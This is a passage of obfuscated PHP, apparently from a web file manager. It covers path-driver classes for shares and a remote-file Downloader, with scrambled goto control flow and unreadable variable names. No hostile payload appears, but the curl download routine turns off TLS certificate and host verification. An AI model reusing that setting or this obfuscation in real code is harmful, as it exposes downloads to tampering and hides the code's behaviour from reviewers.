$this->parse($C¢ÂÎåó ); $AŸñâ—Æ½ = $this->model->move($D›ë¯à…², $FñË«çİÖ[$F—ßÜëè«[378]], $a¹™¿¤æ¯, $FñË«çİÖ[$F—ßÜëè«[87]]); return $AŸñâ—Æ½ ? $this->getPathOuter($AŸñâ—Æ½) : !1; } public function copy($fÚîóØ¾ºĞ, $eİ„ˆÓÍ¹÷, $aó‰ŠÌ„ìõ = REPEAT_REPLACE) { $a§Õ¦ãºŸ = $this->parse($eİ„ˆÓÍ¹÷); $CƒÓ¤®–Ôö = $this->model->copy($fÚîóØ¾ºĞ, $a§Õ¦ãºŸ[$_SERVER[¹÷ˆ§éÒ°ú][378]], $aó‰ŠÌ„ìõ); return $CƒÓ¤®–Ôö ? $this->getPathOuter($CƒÓ¤®–Ôö) : !1; } public function moveSameAllow() { } public function move($D¿ØùÇ×, $CÒ£Ï½É, $Bà—»¤ØÏ… = REPEAT_REPLACE) { $FÒ˜°•‹†­ = $this->parse($CÒ£Ï½É); $E‹‹¶êñ = $this->model->move($D¿ØùÇ×, $FÒ˜°•‹†­[$_SERVER[¹÷ˆ§éÒ°ú][378]], $Bà—»¤ØÏ…); return $E‹‹¶êñ ? $this->getPathOuter($E‹‹¶êñ) : !1; } public function remove($D¢Ë£…‡áÕ, $A¥ŒÎÛÉ› = true) { return $this->model->remove($D¢Ë£…‡áÕ, $A¥ŒÎÛÉ›); } public function rename($B˜éÑ…ßÃ, $FÔÆöî‘Ì) { $d·’ÉÀÈÓš = $this->model->rename($B˜éÑ…ßÃ, $FÔÆöî‘Ì); return $d·’ÉÀÈÓš ? $this->getPathOuter($B˜éÑ…ßÃ) : $d·’ÉÀÈÓš; } public function size($a¶êîÔÖå‘) { $fÕóÉ´Òµî = $this->infoSimple($a¶êîÔÖå‘); return $fÕóÉ´Òµî ? $fÕóÉ´Òµî[$_SERVER[¹÷ˆ§éÒ°ú][89]] : 0; } public function infoSimple($eÅ¸Ş‹¥À) { return $this->model->sourceInfo($eÅ¸Ş‹¥À); } public function info($C‰‰¿¸²¼Á) { return $this->infoParse($C‰‰¿¸²¼Á); } public function infoAuth($f¦Ëâ“¬–) { return $this->infoParse($f¦Ëâ“¬–, !1, !0); } public function infoWithChildren($bò­˜¿) { return $this->infoParse($bò­˜¿, !0); } protected function infoParse($FÈÉÏÓ¢†—, $a·Ó¢ñ†í = false, $a¯ÒĞƒë£© = false) { if (!$a·Ó¢ñ†í) { return $this->model->pathInfo($FÈÉÏÓ¢†—, $a¯ÒĞƒë£©); } return $this->model->pathInfoMore($FÈÉÏÓ¢†—); } public function infoFull($c×Ä‹®õ¨Ç) { $d¢‰àÔ©â” =& $_SERVER[¹÷ˆ§éÒ°ú]; $d¤æ™£åà = explode($d¢‰àÔ©â”[18], $c×Ä‹®õ¨Ç); $bƒ‚Û»¹Ã = implode($d¢‰àÔ©â”[18], array_splice($d¤æ™£åà, 1)); return $this->model->pathInfoByPath($d¤æ™£åà[0], $bƒ‚Û»¹Ã); } public function hashSimple($a•„ËøàŒ¬) { $A˜âù¤¾ä‚ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d„³§ïî„› = $this->infoWithChildren($a•„ËøàŒ¬); return $d„³§ïî„›[$A˜âù¤¾ä‚[174]][$A˜âù¤¾ä‚[176]]; } public function hashMd5($A¼…–õ„ãæ) { $eŞ…ëåŒ¼Ÿ =& $_SERVER[¹÷ˆ§éÒ°ú]; $f—Õ·ËÂ²ë = $this->infoWithChildren($A¼…–õ„ãæ); return $f—Õ·ËÂ²ë[$eŞ…ëåŒ¼Ÿ[174]][$eŞ…ëåŒ¼Ÿ[175]]; } public function exist($A¨—²äÁÄØ) { $cÖ¹ä¿ïó˜ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Eêƒ„äˆÇ = $this->parse($A¨—²äÁÄØ); if (!$Eêƒ„äˆÇ[$cÖ¹ä¿ïó˜[87]]) { return $this->isFile($A¨—²äÁÄØ) || $this->isFolder($A¨—²äÁÄØ); } $eÚ÷²Ø¤‘ = array($cÖ¹ä¿ïó˜[379] => $Eêƒ„äˆÇ[$cÖ¹ä¿ïó˜[378]], $cÖ¹ä¿ïó˜[38] => $Eêƒ„äˆÇ[$cÖ¹ä¿ïó˜[87]]); $B“ğ…´Í… = $this->model->where($eÚ÷²Ø¤‘)->find(); return $B“ğ…´Í… ? !0 : !1; } public function isFile($dééåŠœ“) { $Dè±…ÖŸÛ =& $_SERVER[¹÷ˆ§éÒ°ú]; $b÷“ëÉÃ“ = $this->infoSimple($dééåŠœ“); return $b÷“ëÉÃ“ && $b÷“ëÉÃ“[$Dè±…ÖŸÛ[381]] == $Dè±…ÖŸÛ[95] ? !1 : !0; } public function isFolder($D‘á¸ÓÀí) { $EÌ¿ù”Ş¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; $cöß†º‹ôˆ = $this->infoSimple($D‘á¸ÓÀí); return $cöß†º‹ôˆ && $cöß†º‹ôˆ[$EÌ¿ù”Ş¶[381]] == $EÌ¿ù”Ş¶[95] ? !0 : !1; } public function listPath($C†îá“•åî, $Aªƒ”˜ = false) { $b¡“òğÌê² =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($C†îá“•åî == $b¡“òğÌê²[43]) { return !1; } $eÙ£µâåÑ = array($b¡“òğÌê²[379] => $C†îá“•åî); if ($Aªƒ”˜) { return $this->model->listSource($eÙ£µâåÑ, -1); } return $this->model->listSource($eÙ£µâåÑ); } public function has($c‚­ŒŞÎ, $B´ßÙÒ¬„Š = false, $EÑ£Ã§µÎ = null) { $E£•¤‰ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d¯ÎçË³ù = $this->infoWithChildren($c‚­ŒŞÎ); if ($B´ßÙÒ¬„Š) { return array($E£•¤‰[204] => $d¯ÎçË³ù[$E£•¤‰[204]], $E£•¤‰[203] => $d¯ÎçË³ù[$E£•¤‰[203]]); } return $EÑ£Ã§µÎ ? $d¯ÎçË³ù[$E£•¤‰[204]] : $d¯ÎçË³ù[$E£•¤‰[203]]; } public function listAll($E‚ŠÑ’ˆ…¦) { $D™‰Ãœß…‘ = IO::info($this->pathParse[$_SERVER[¹÷ˆ§éÒ°ú][87]]); if (!$D™‰Ãœß…‘) { return array(); } return $this->model->listAll($E‚ŠÑ’ˆ…¦); } public function getContent($aøç¿øÇ¡ä) { return $this->model->getContent($aøç¿øÇ¡ä); } public function setContent($a¤Á¿Û«İ, $b‰Ú¥§Í“è = '') { return $this->model->setContent($a¤Á¿Û«İ, $b‰Ú¥§Í“è); } public function fileSubstr($DŸ¤Šßùœ, $b¯ÙÄ½ÂåŠ, $c¹Ô‡Ø½„Ş) { return $this->model->fileSubstr($DŸ¤Šßùœ, $b¯ÙÄ½ÂåŠ, $c¹Ô‡Ø½„Ş); } public function download($CôáÌäÊî¡, $eùÓ¶ì¥†Ò = '') { $FÑºÍì•ùÄ = get_path_father($eùÓ¶ì¥†Ò); $Dæ…ğ£¿ğ‚ = get_path_this($eùÓ¶ì¥†Ò); $D†‡º‡Óî“ = $this->model->fileInfoGet($CôáÌäÊî¡); $aˆÅ«à³®œ = IO::copy($D†‡º‡Óî“[$_SERVER[¹÷ˆ§éÒ°ú][87]], $FÑºÍì•ùÄ, !1, $Dæ…ğ£¿ğ‚); return $aˆÅ«à³®œ; } public function setModifyTime($Dê½†íÅšË, $Fæ²œÓËî = '') { $this->model->metaSet($Dê½†íÅšË, $_SERVER[¹÷ˆ§éÒ°ú][1110], $Fæ²œÓËî); } public function upload($e³İ¯‡Ğïß, $B”Š¼Âš´, $e¨¶Ğ¼ªÌÖ = false, $bÉ”öÉø‹Ü = REPEAT_REPLACE) { $C»•³Ï™˜© =& $_SERVER[¹÷ˆ§éÒ°ú]; $e‹‰ÍÁˆ£¤ = $this->parse($e³İ¯‡Ğïß); $ešˆØŒÇÅÁ = $this->model->addFile($e‹‰ÍÁˆ£¤[$C»•³Ï™˜©[378]], $B”Š¼Âš´, $e‹‰ÍÁˆ£¤[$C»•³Ï™˜©[87]], $e¨¶Ğ¼ªÌÖ, $bÉ”öÉø‹Ü); return $this->getPathOuter($ešˆØŒÇÅÁ); } public function uploadFileByID($B²½ÇÙÔ‡ï, $aØË¾’Œ‹›, $e×ÒªñáÔ½) { $Eõ‰ßŒ¡Ì´ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÑèîˆî¶Ë = $this->parse($B²½ÇÙÔ‡ï); $d°Á´±—Á¥ = $this->model->addFileByFileID($dÑèîˆî¶Ë[$Eõ‰ßŒ¡Ì´[378]], $aØË¾’Œ‹›, $dÑèîˆî¶Ë[$Eõ‰ßŒ¡Ì´[87]], $e×ÒªñáÔ½); return $this->getPathOuter($d°Á´±—Á¥); } public function addFileByRemote($BõêÓÛ”Ü, $dŠ½¤ò¹”õ, $dİ†µÕùÁ = array(), $BŸ…¥Ë³‘ = '', $A÷Ö¹ç¹Ã©) { $CºªŠÁÁ·÷ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Bš‹ä„ß Û = $this->parse($BõêÓÛ”Ü); $BŸ…¥Ë³‘ = empty($BŸ…¥Ë³‘) ? $Bš‹ä„ß Û[$CºªŠÁÁ·÷[87]] : $BŸ…¥Ë³‘; $d‡Ğé“ Êº = $this->model->addFileByRemote($Bš‹ä„ß Û[$CºªŠÁÁ·÷[378]], $dŠ½¤ò¹”õ, $BŸ…¥Ë³‘, $dİ†µÕùÁ, $A÷Ö¹ç¹Ã©); return $this->getPathOuter($d‡Ğé“ Êº); } public function uploadLink($d‘ÒŞ‚é¨, $bå¤ˆ¤ÍÀ = 0) { $F·Íà²œ† =& $_SERVER[¹÷ˆ§éÒ°ú]; $c´àëĞÕ˜¸ = $this->parse($d‘ÒŞ‚é¨); $d‘ÒŞ‚é¨ = Model($F·Íà²œ†[557])->createFileName($c´àëĞÕ˜¸[$F·Íà²œ†[87]]); $C„ÚŒÛ’¤— = IO::uploadLink($d‘ÒŞ‚é¨, $bå¤ˆ¤ÍÀ); return $C„ÚŒÛ’¤—; } public function fileNameAuto($C·›õ°ö‡·, $E’ë‡•øù², $E„Î•—òš× = REPEAT_REPLACE, $fØëØìÙ£× = false) { return $this->model->fileNameAuto($C·›õ°ö‡·, $E’ë‡•øù², $E„Î•—òš×, $fØëØìÙ£×); } public function fileNameExist($eîÖÚ£§™Ê, $EºËê¯‘¹ø) { return $this->model->fileNameExist($eîÖÚ£§™Ê, $EºËê¯‘¹ø); } protected function _fileOut($e®”æĞ¿ë±, $F¿‡…»éŠØ = false, $bèÎø™Á‹Å = false, $eÚÒº°š = '', $CµˆñÚÅë» = false) { goto BöÀ‡Ğ’…¾; e²ŞŸò›«†: if ($CµˆñÚÅë») { return IO::fileOutServer($F»ê…±‘Öæ[$aĞ ‡–¯„[87]], $F¿‡…»éŠØ, $eŠ ”ñ¹Â, $eÚÒº°š); } IO::fileOut($F»ê…±‘Öæ[$aĞ ‡–¯„[87]], $F¿‡…»éŠØ, $eŠ ”ñ¹Â, $eÚÒº°š); goto eô—‰ÒÀõÁ; C¿ïÊ¯¯Õ: $F»ê…±‘Öæ = $this->model->fileInfoGet($e®”æĞ¿ë±); $eÚÒº°š = $F»ê…±‘Öæ[$aĞ ‡–¯„[175]] ? $F»ê…±‘Öæ[$aĞ ‡–¯„[175]] : $eÚÒº°š; $eŠ ”ñ¹Â = isset($GLOBALS[$aĞ ‡–¯„[1112]]) ? $GLOBALS[$aĞ ‡–¯„[1112]] : $C°¢Ç“¥¬[$aĞ ‡–¯„[38]]; goto e²ŞŸò›«†; BöÀ‡Ğ’…¾: $aĞ ‡–¯„ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C°¢Ç“¥¬ = $this->model->sourceInfo($e®”æĞ¿ë±); if ($C°¢Ç“¥¬[$aĞ ‡–¯„[381]] == $aĞ ‡–¯„[95]) { header($aĞ ‡–¯„[1111]); die; } goto C¿ïÊ¯¯Õ; eô—‰ÒÀõÁ: } public function fileOut($aïå‡ë„¼›, $B°ª†ÖÄ¤ = false, $b·ç¼¦ŒÒ = false, $bˆŸ•¾Ÿåî = '') { $this->_fileOut($aïå‡ë„¼›, $B°ª†ÖÄ¤, $b·ç¼¦ŒÒ, $bˆŸ•¾Ÿåî); } public function fileOutServer($CìæŞ™¦, $bŸó÷Ä‹ù = false, $Eñäœ¾¸Ò¿ = false, $b¯ÂÃ»ÍíÒ = '') { $this->_fileOut($CìæŞ™¦, $bŸó÷Ä‹ù, $Eñäœ¾¸Ò¿, $b¯ÂÃ»ÍíÒ, !0); } protected function _fileOutImage($A­­ÁØÍ», $AºÈÏñéÀ = 250) { $C×œ¿¤¾õ˜ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Eù†ºÉùÔè = $this->model->sourceInfo($A­­ÁØÍ»); if ($Eù†ºÉùÔè[$C×œ¿¤¾õ˜[381]] == $C×œ¿¤¾õ˜[95]) { show_json($C×œ¿¤¾õ˜[1113] . $A­­ÁØÍ», !1); } $GLOBALS[$C×œ¿¤¾õ˜[1112]] = $Eù†ºÉùÔè[$C×œ¿¤¾õ˜[38]]; $f°‘Ùˆ¬ø = $this->model->fileInfoGet($A­­ÁØÍ»); IO::fileOutImage($f°‘Ùˆ¬ø[$C×œ¿¤¾õ˜[87]], $AºÈÏñéÀ); } public function fileOutImage($A×›£ø¤ò, $DíØÎÙ–¯ = 250) { $this->_fileOutImage($A×›£ø¤ò, $DíØÎÙ–¯); } public function fileOutImageServer($e™ ‚“Å¬, $b´Ç”¦Ñ = 250) { $this->_fileOutImage($e™ ‚“Å¬, $b´Ç”¦Ñ); } public function link($EÃŸ¿ºÃô’, $f…‹ÃÒİï„ = '') { $AÚ¾Ò°Ä‹Ù = $this->model->fileInfoGet($EÃŸ¿ºÃô’); return IO::link($AÚ¾Ò°Ä‹Ù[$_SERVER[¹÷ˆ§éÒ°ú][87]], $f…‹ÃÒİï„); } protected function parse($Dİ±âİóòÜ) { $bÛ˜¶š÷¤ì =& $_SERVER[¹÷ˆ§éÒ°ú]; if (strstr($Dİ±âİóòÜ, $bÛ˜¶š÷¤ì[18]) === !1) { return array($bÛ˜¶š÷¤ì[396] => intval($Dİ±âİóòÜ), $bÛ˜¶š÷¤ì[87] => $bÛ˜¶š÷¤ì[43], $bÛ˜¶š÷¤ì[1109] => array()); } $B’•ó²ìß = explode($bÛ˜¶š÷¤ì[18], trim($Dİ±âİóòÜ, $bÛ˜¶š÷¤ì[18])); if (count($B’•ó²ìß) < 2) { show_tips($Dİ±âİóòÜ . $bÛ˜¶š÷¤ì[1114]); } return array($bÛ˜¶š÷¤ì[396] => intval($B’•ó²ìß[0]), $bÛ˜¶š÷¤ì[87] => $B’•ó²ìß[1], $bÛ˜¶š÷¤ì[1109] => array_slice($B’•ó²ìß, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($c½»œù½…) { $this->pathParse = $c½»œù½…; $this->model = Model($_SERVER[¹÷ˆ§éÒ°ú][1108]); } public function getPathOuter($aÚãêå°—¸) { $Eî’ƒ°ğÌÓ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$aÚãêå°—¸) { return $aÚãêå°—¸; } $c¢¾œ«‡Í› = $this->parse($aÚãêå°—¸); return trim(KodIO::makeShare($this->pathParse[$Eî’ƒ°ğÌÓ[378]], $c¢¾œ«‡Í›[$Eî’ƒ°ğÌÓ[378]]), $Eî’ƒ°ğÌÓ[18]); } protected function infoParse($CÖÚÙ­, $eî§ò©¦›ö = false, $D±°¸Šè† = false) { $D¶‘à ¥Í =& $_SERVER[¹÷ˆ§éÒ°ú]; $bóÄì¨Ôƒ‚ = $this->pathParse[$D¶‘à ¥Í[378]]; $C†É¢¬²Àâ = trim($this->pathParse[$D¶‘à ¥Í[1003]], $D¶‘à ¥Í[18]); return Action($D¶‘à ¥Í[1115])->sharePathInfo($bóÄì¨Ôƒ‚, $C†É¢¬²Àâ); } public function infoFull($E˜×õÔğØ×) { $a‚½Éø—á =& $_SERVER[¹÷ˆ§éÒ°ú]; $C¯ù­„èÚÓ = explode($a‚½Éø—á[18], trim($E˜×õÔğØ×, $a‚½Éø—á[18])); if (count($C¯ù­„èÚÓ) > 1) { $f®ğ•í‹‹« = implode($a‚½Éø—á[18], array_splice($C¯ù­„èÚÓ, 1)); $fÊ½Ÿ–èğ§ = $this->model->pathInfoByPath($C¯ù­„èÚÓ[0], $f®ğ•í‹‹«); if (!$fÊ½Ÿ–èğ§) { return !1; } $this->pathParse[$a‚½Éø—á[1003]] = $fÊ½Ÿ–èğ§[$a‚½Éø—á[380]]; } return $this->infoParse($E˜×õÔğØ×); } public function listAll($cÕÒ¬ÄéÓÁ) { goto cç˜Ï¨„Ì; Fº¦·‡Å·¯: foreach ($a¥×Í‹Ñ–» as &$B²³ã¬„Ÿ¿) { check_abort(); $B²³ã¬„Ÿ¿[$E¤“ÒƒÒÑ¦[402]] = $EæÉ¸²È‡->_shareItemeParse($B²³ã¬„Ÿ¿[$E¤“ÒƒÒÑ¦[402]], $b¾í“ãô°ê); } return $a¥×Í‹Ñ–»; goto Fƒ‚»˜“«ğ; cç˜Ï¨„Ì: $E¤“ÒƒÒÑ¦ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Fğôê¿™Ò = IO::info($this->pathParse[$E¤“ÒƒÒÑ¦[87]]); if (!$Fğôê¿™Ò) { return array(); } goto aãØ˜‘‚ë; aãØ˜‘‚ë: $a¥×Í‹Ñ–» = $this->model->listAll($cÕÒ¬ÄéÓÁ); $b¾í“ãô°ê = Model($E¤“ÒƒÒÑ¦[549])->getInfo($Fğôê¿™Ò[$E¤“ÒƒÒÑ¦[452]]); $EæÉ¸²È‡ = Action($E¤“ÒƒÒÑ¦[1115]); goto Fº¦·‡Å·¯; Fƒ‚»˜“«ğ: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($c¥­…‘é) { $this->pathParse = $c¥­…‘é; $this->model = Model($_SERVER[¹÷ˆ§éÒ°ú][1108]); } protected function infoParse($D‘í’÷’—, $Cî¢›£Ç· = false, $Däİ¾è¨¼‹ = false) { $f¸Œ½ÂÎÙ =& $_SERVER[¹÷ˆ§éÒ°ú]; return Action($f¸Œ½ÂÎÙ[1009])->sharePathInfo($this->pathParse[$f¸Œ½ÂÎÙ[87]], !0); } public function listPath($DøİŞ¾ê¡Ì, $D²Ì·´İ¾± = false) { $B´Ù‘ÀÌù =& $_SERVER[¹÷ˆ§éÒ°ú]; $F£Ş®Øê = parent::listPath($DøİŞ¾ê¡Ì, $D²Ì·´İ¾±); foreach ($F£Ş®Øê as $aòÛ›èÒ°È => $fƒâöÛÂ) { if (!in_array($aòÛ›èÒ°È, array($B´Ù‘ÀÌù[85], $B´Ù‘ÀÌù[86]))) { continue; } foreach ($fƒâöÛÂ as $A–‡ƒÕƒ°Í => $Eˆ¹»Œ†ù) { $F£Ş®Øê[$aòÛ›èÒ°È][$A–‡ƒÕƒ°Í] = Action($B´Ù‘ÀÌù[1009])->shareItemInfo($Eˆ¹»Œ†ù); } } return $F£Ş®Øê; } public function listAll($BÇåæç†ù“) { $Bİ¡ëê•¶‹ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EÎ¾¸‘Ç„Ş = IO::info($this->pathParse[$Bİ¡ëê•¶‹[87]]); if (!$EÎ¾¸‘Ç„Ş) { return array(); } $c¦­ê®½ó = $this->model->listAll($BÇåæç†ù“); foreach ($c¦­ê®½ó as &$c•ÎÓ÷êÈİ) { $c•ÎÓ÷êÈİ[$Bİ¡ëê•¶‹[402]] = Action($Bİ¡ëê•¶‹[1009])->shareItemInfo($c•ÎÓ÷êÈİ[$Bİ¡ëê•¶‹[402]]); } return $c¦­ê®½ó; } } goto dÊ‘ ¹é¿İ; b³ï¯¤Ïøï: function beforeShutdown() { Hook::trigger($_SERVER[Œá²][32]); } $_SERVER[$_SERVER[Œá²][33]] = BASIC_PATH; $_SERVER[$_SERVER[Œá²][34]] = LIB_DIR; goto d‡éÌø‹; f×¢öÑÅÌË: class Downloader { static function start($Cùì‚ÛéÒ¼, $Fİ¹Ô„óíŠ, $b¦ª¦˜¹‹ = 10) { goto aÙ‰«Ú†Ğ; e÷±™¥áïİ: if ($f¥„òºñ[$c§çìŠ¡å­[1023]]) { @unlink($eñœÑŠÃï); } return $f¥„òºñ; goto EÓã“— ïã; aÙ‰«Ú†Ğ: $c§çìŠ¡å­ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!request_url_safe($Cùì‚ÛéÒ¼)) { return array($c§çìŠ¡å­[1023] => !1, $c§çìŠ¡å­[1025] => $c§çìŠ¡å­[1028]); } $eñœÑŠÃï = $Fİ¹Ô„óíŠ . $c§çìŠ¡å­[1505]; goto e®ÉÁ›™ÄÓ; fÔÔğÑåˆê: $cÏƒÖÑ†· = intval($a¾æ¾ŠÓÆ[$c§çìŠ¡å­[336]]); if (file_exists($cĞîÊÍ˜‰ù) && time() - filemtime($cĞîÊÍ˜‰ù) < 3) { return array($c§çìŠ¡å­[1023] => !1, $c§çìŠ¡å­[1025] => $c§çìŠ¡å­[1507]); } $AïµÊóàö = array(); goto Bºñâ•¤Í‡; Bºñâ•¤Í‡: if (is_file($eñœÑŠÃï)) { $EÃÆÍŒÊä† = file_get_contents($eñœÑŠÃï); $AïµÊóàö = json_decode($EÃÆÍŒÊä†, 1); } if (file_exists($Fİ¹Ô„óíŠ) && $cÏƒÖÑ†· == filesize($Fİ¹Ô„óíŠ)) { @unlink($cĞîÊÍ˜‰ù); @unlink($eñœÑŠÃï); return array($c§çìŠ¡å­[1023] => !0, $c§çìŠ¡å­[1025] => $c§çìŠ¡å­[1508]); } if ($AïµÊóàö[$c§çìŠ¡å­[336]] != $cÏƒÖÑ†·) { $AïµÊóàö = array($c§çìŠ¡å­[336] => $cÏƒÖÑ†·); } goto c»àÅÁ£Ò©; e®ÉÁ›™ÄÓ: $cĞîÊÍ˜‰ù = $Fİ¹Ô„óíŠ . $c§çìŠ¡å­[1506]; if (is_array($Cùì‚ÛéÒ¼)) { $a¾æ¾ŠÓÆ = $Cùì‚ÛéÒ¼; } else { $a¾æ¾ŠÓÆ = url_header($Cùì‚ÛéÒ¼); } $Cùì‚ÛéÒ¼ = $a¾æ¾ŠÓÆ[$c§çìŠ¡å­[306]]; goto fÑ×©§´Ä‹; c»àÅÁ£Ò©: if ($a”ä›‡–§‚ > $cÏƒÖÑ†·) { @unlink($cĞîÊÍ˜‰ù); } file_put_contents($eñœÑŠÃï, json_encode($AïµÊóàö)); $f¥„òºñ = self::fileDownloadCurl($Cùì‚ÛéÒ¼, $Fİ¹Ô„óíŠ, !0, $a”ä›‡–§‚, $cÏƒÖÑ†·); goto e÷±™¥áïİ; fÑ×©§´Ä‹: if (!$Cùì‚ÛéÒ¼) { return array($c§çìŠ¡å­[1023] => !1, $c§çìŠ¡å­[1025] => $c§çìŠ¡å­[1028]); } if (!$a¾æ¾ŠÓÆ[$c§çìŠ¡å­[1279]] || $a¾æ¾ŠÓÆ[$c§çìŠ¡å­[336]] == 0) { @unlink($cĞîÊÍ˜‰ù); @unlink($Fİ¹Ô„óíŠ); $f¥„òºñ = self::fileDownloadFopen($Cùì‚ÛéÒ¼, $Fİ¹Ô„óíŠ, $a¾æ¾ŠÓÆ[$c§çìŠ¡å­[336]]); if ($f¥„òºñ[$c§çìŠ¡å­[1023]]) { return $f¥„òºñ; } else { @unlink($cĞîÊÍ˜‰ù); @unlink($Fİ¹Ô„óíŠ); $f¥„òºñ = self::fileDownloadCurl($Cùì‚ÛéÒ¼, $Fİ¹Ô„óíŠ, !1, 0, $a¾æ¾ŠÓÆ[$c§çìŠ¡å­[336]]); @unlink($cĞîÊÍ˜‰ù); return $f¥„òºñ; } } $a”ä›‡–§‚ = is_file($cĞîÊÍ˜‰ù) ? filesize($cĞîÊÍ˜‰ù) : 0; goto fÔÔğÑåˆê; EÓã“— ïã: } static function fileDownloadFopen($e·ÁÏ™™ùì, $D˜ç‘¸÷Å, $eÆº¸ò°»İ = 0) { $b«”µÔ¡æ› =& $_SERVER[¹÷ˆ§éÒ°ú]; @ini_set($b«”µÔ¡æ›[1509], $b«”µÔ¡æ›[1510]); $DÏÉÆ©ÚŸÔ = $D˜ç‘¸÷Å . $b«”µÔ¡æ›[1506]; set_timeout(); @unlink($DÏÉÆ©ÚŸÔ); if ($E¢ìº›©£Õ = @fopen($e·ÁÏ™™ùì, $b«”µÔ¡æ›[1511])) { goto FÛ „¼ò¹; FÛ „¼ò¹: if (!($Bá½Ğ™½¼› = @fopen($DÏÉÆ©ÚŸÔ, $b«”µÔ¡æ›[1512]))) { return array($b«”µÔ¡æ›[1023] => !1, $b«”µÔ¡æ›[1025] => $b«”µÔ¡æ›[1513]); } while (!feof($E¢ìº›©£Õ)) { if (!file_exists($DÏÉÆ©ÚŸÔ)) { fclose($Bá½Ğ™½¼›); return array($b«”µÔ¡æ›[1023] => !1, $b«”µÔ¡æ›[1025] => $b«”µÔ¡æ›[1514]); } clearstatcache(); if ($eÆº¸ò°»İ > 0 && $eÆº¸ò°»İ == filesize(iconv_system($DÏÉÆ©ÚŸÔ))) { break; } fwrite($Bá½Ğ™½¼›, fread($E¢ìº›©£Õ, 1024 * 8), 1024 * 8); } fclose($Bá½Ğ™½¼›); goto cÛÎ‰ñŠ˜ª; b–ÑßæßÇ: return array($b«”µÔ¡æ›[1023] => !0, $b«”µÔ¡æ›[1025] => $b«”µÔ¡æ›[691]); goto b§Öç“ˆ ; cÛÎ‰ñŠ˜ª: fclose($E¢ìº›©£Õ); self::checkGzip($DÏÉÆ©ÚŸÔ); if (!@rename($DÏÉÆ©ÚŸÔ, $D˜ç‘¸÷Å)) { usleep(round(rand(0, 1000) * 50)); @unlink($D˜ç‘¸÷Å); $eêÖ½Ä÷‘Á = @rename($DÏÉÆ©ÚŸÔ, $D˜ç‘¸÷Å); if (!$eêÖ½Ä÷‘Á) { return array($b«”µÔ¡æ›[1023] => !1, $b«”µÔ¡æ›[1025] => $b«”µÔ¡æ›[1515]); } } goto b–ÑßæßÇ; b§Öç“ˆ : } else { return array($b«”µÔ¡æ›[1023] => !1, $b«”µÔ¡æ›[1025] => $b«”µÔ¡æ›[1516]); } } static function fileDownloadCurl($bÏ˜ˆğñ¾, $d•íÏŠŞ„‹, $Bá††æ³è = false, $c”§œÕôÂÂ = 0, $cğöÕœ‡‰ = 0) { goto D÷Ó×äÇ×°; b•µŞ®—Ù¯: if ($Bá††æ³è) { curl_setopt($Eõì¾èÒ¤Ñ, CURLOPT_RANGE, $c”§œÕôÂÂ . $FŠšç—ôò[710]); } curl_setopt($Eõì¾èÒ¤Ñ, CURLOPT_FILE, $a†Ô„Á…ƒ); curl_setopt($Eõì¾èÒ¤Ñ, CURLOPT_REFERER, get_url_link($bÏ˜ˆğñ¾)); goto A…å¬ƒÔœÛ; D÷Ó×äÇ×°: $FŠšç—ôò =& $_SERVER[¹÷ˆ§éÒ°ú]; $B¨£ĞŸßÎó = $d•íÏŠŞ„‹ . $FŠšç—ôò[1506]; set_timeout(); goto fá¦›æ¥—Û; bÕŠÌ²÷ƒÚ: if ($fŸ šø–ì < $cğöÕœ‡‰ && $cğöÕœ‡‰ != 0) { return array($FŠšç—ôò[1023] => !1, $FŠšç—ôò[1025] => $FŠšç—ôò[1507]); } if ($c¼ñ¾ˆÅ—¥ && filesize($B¨£ĞŸßÎó) != 0) { self::checkGzip($B¨£ĞŸßÎó); if (!@rename($B¨£ĞŸßÎó, $d•íÏŠŞ„‹)) { @unlink($d•íÏŠŞ„‹); $c¼ñ¾ˆÅ—¥ = @rename($B¨£ĞŸßÎó, $d•íÏŠŞ„‹); if (!$c¼ñ¾ˆÅ—¥) { return array($FŠšç—ôò[1023] => !1, $FŠšç—ôò[1025] => $FŠšç—ôò[1519]); } } return array($FŠšç—ôò[1023] => !0, $FŠšç—ôò[1025] => $FŠšç—ôò[691]); } return array($FŠšç—ôò[1023] => !1, $FŠšç—ôò[1025] => $FŠšç—ôò[1520]); goto a¸Èî“ŒÍ‘; D‘‰È‚“Ä„: curl_close($Eõì¾èÒ¤Ñ); fclose($a†Ô„Á…ƒ); $fŸ šø–ì = filesize(iconv_system($B¨£ĞŸßÎó)); goto bÕŠÌ²÷ƒÚ; A…å¬ƒÔœÛ: curl_setopt($Eõì¾èÒ¤Ñ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($Eõì¾èÒ¤Ñ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($Eõì¾èÒ¤Ñ, CURLOPT_SSL_VERIFYHOST, 0); goto e¡Ù±õÕö; FËŒµÀ†Ã§: curl_setopt($Eõì¾èÒ¤Ñ, CURLOPT_USERAGENT, $FŠšç—ôò[1510]); $c¼ñ¾ˆÅ—¥ = curl_exec($Eõì¾èÒ¤Ñ); curl_progress_end($Eõì¾èÒ¤Ñ); goto D‘‰È‚“Ä„; e¡Ù±õÕö: curl_setopt($Eõì¾èÒ¤Ñ, CURLOPT_NOPROGRESS, !1); curl_setopt($Eõì¾èÒ¤Ñ, CURLOPT_PROGRESSFUNCTION, $FŠšç—ôò[1518]); curl_progress_start($Eõì¾èÒ¤Ñ); goto FËŒµÀ†Ã§; fá¦›æ¥—Û: $a†Ô„Á…ƒ = @fopen($B¨£ĞŸßÎó, $FŠšç—ôò[971]); if (!$a†Ô„Á…ƒ) { return array($FŠšç—ôò[1023] => !1, $FŠšç—ôò[1025] => $FŠšç—ôò[1517]); } $Eõì¾èÒ¤Ñ = curl_init($bÏ˜ˆğñ¾); goto b•µŞ®—Ù¯; a¸Èî“ŒÍ‘: } static function checkGzip($FĞÔ÷àê¶) { goto EâÀÖ† «; bŒ›İïËÀ: 